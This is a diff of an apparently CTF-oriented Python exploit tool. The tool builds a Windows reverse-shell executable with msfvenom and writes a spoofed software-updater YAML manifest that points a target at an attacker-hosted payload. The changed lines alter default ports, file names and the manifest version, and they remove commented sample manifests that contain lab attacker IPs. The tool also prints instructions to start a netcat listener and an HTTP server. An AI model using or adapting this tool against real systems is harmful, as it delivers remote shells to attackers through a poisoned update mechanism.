@@ -22,7 +22,7 @@ def gen_payload(ip, port, payload, dir):
 
     # cmd_str = 'msfvenom -a x86 --platform windows -p ' + payload + ' LHOST=' + str(ip) + ' LPORT=' + str(port) + ' -f exe -o "' + dir + 'heedv1\'Setup1.0.1.exe"'
 
-    cmd_str = 'msfvenom -p ' + payload + ' LHOST=' + str(ip) + ' LPORT=' + str(port) + ' -f exe -o "' + dir + 'heed\'Setup.exe"'
+    cmd_str = 'msfvenom -p ' + payload + ' LHOST=' + str(ip) + ' LPORT=' + str(port) + ' -f exe -o "' + dir + 'heed\'setup.exe"'
 
     print("Running command: " + cmd_str)
     
@@ -36,7 +36,7 @@ def get_payload(args, ip, port, path):
 
     payload_path = ""
 
-    payload_name = 'heed\'Setup.exe'
+    payload_name = 'heed\'setup.exe'
 
     #get payload options, taking --payload as priority over --msf_payload if both provided
     if args.payload is not None:
@@ -99,34 +99,10 @@ def gen_yaml(ip, payload, size, sum, dir):
 
     print("\n=== Generating YAML File ===\n")
 
-    yml_string = ("version: 2.0.9\n"
+    yml_string = ("version: 2.1.9\n"
         "path: http://{ip}/{payload}\n"
         "sha512: {sha}"
     ).format(ip=ip, payload=payload, sha=sum)
-
-    # yml_string = ("version: 1.0.1\n"
-    #     "files:\n"
-    #     "  url: http://{ip}/{payload}\n"
-    #     "  sha512: {sha}\n"
-    #     "  size: {size}\n"
-    #     "path: http://{ip}/{payload}\n"
-    #     "sha512: {sha}\n"
-    #     "releaseDate: '2021-04-21T11:17:02.627Z'"
-    #     ).format(ip=ip, payload=payload, sha=sum, size=size)
-
-    # version: 1.0.1
-    # files:
-    #   url: http://10.10.14.193/heedv1'Setup1.0.1.exe
-    #   sha512: 0BsRscpeO3lQvkaP1fqRYWyw3lelkI/2qJ1BsshauD8kJ39nHJKFanTUVpUNRotgKkVljcEy/Is9U87FIbYrPw==
-    #   size: 73802
-    # path: http://10.10.14.193/heedv1'Setup1.0.1.exe
-    # sha512: 0BsRscpeO3lQvkaP1fqRYWyw3lelkI/2qJ1BsshauD8kJ39nHJKFanTUVpUNRotgKkVljcEy/Is9U87FIbYrPw==
-    # releaseDate: '2021-04-21T11:17:02.627Z'
-
-    # version: 1.0.1
-    # path: http://10.10.14.167/heedv1'Setup1.0.1.exe
-    # sha512: 0BsRscpeO3lQvkaP1fqRYWyw3lelkI/2qJ1BsshauD8kJ39nHJKFanTUVpUNRotgKkVljcEy/Is9U87FIbYrPw==
-    # releaseDate: '2021-04-21T11:17:02.627Z'
     
     print(yml_string)
 
@@ -179,10 +155,10 @@ def main():
 
     #named parameters/flags
     parser.add_argument("-p", "--payload", help="The path to an existing payload. Specify this if you don't want to generate one with msfvenom", dest="payload")
-    parser.add_argument("-m", "--msf_payload", help="Msfvenom payload to use. Default is windows/x64/shell_reverse_tcp", dest="msf_payload")
+    parser.add_argument("-m", "--msf_payload", help="Msfvenom payload to use. Default is windows/shell_reverse_tcp", dest="msf_payload")
     parser.add_argument("-a", "--lip", help="Local IP address to listen on. Specify either this or --lint", dest="lip")
     parser.add_argument("-i", "--lint", help="Local interface to listen on. Specify either this or --lip", dest="lint")
-    parser.add_argument("-P", "--lport", help="Local port to listen on. 9001 by default", dest="lport")
+    parser.add_argument("-P", "--lport", help="Local port to listen on. 443 by default, may not work on non-standard ports", dest="lport")
     parser.add_argument("-d", "--dir", help="Directory to save payload and stand up server in", dest="dir")
 
     #parse arguments
@@ -190,7 +166,7 @@ def main():
 
     #default values
     path = ""
-    port = "9001"
+    port = "443"
 
     #get local IP, taking --lip as priority over --lint if both provided
     if args.lip is not None:
@@ -210,7 +186,7 @@ def main():
     #mkdir if doesn't exist
     arg_path = args.dir
     if arg_path is not None:
-        path = arg_path + "/"
+        path = arg_path
         dirpath = Path(arg_path)
 
         if not dirpath.is_dir():
@@ -219,7 +195,7 @@ def main():
 
     # remind user to start a listener
     # in future, start python server in a thread
-    print("Make sure to start required listeners before continuing.\nRun a netcat listener to catch your shell: nc -lnvp {port}\nRun a Python Server to serve your shell in {dir}: sudo python3 -m http.server 80".format(port=port, dir=path))
+    print("Make sure to start required listeners before continuing.\nRun a netcat listener to catch your shell: sudo nc -lnvp {port}\nRun a Python Server to serve your shell in {dir}: sudo python3 -m http.server 80".format(port=port, dir=path))
     input("Press enter to continue once you've started your listeners...\n")
     
     payload_name, size, sum = get_payload(args, ip, port, path)
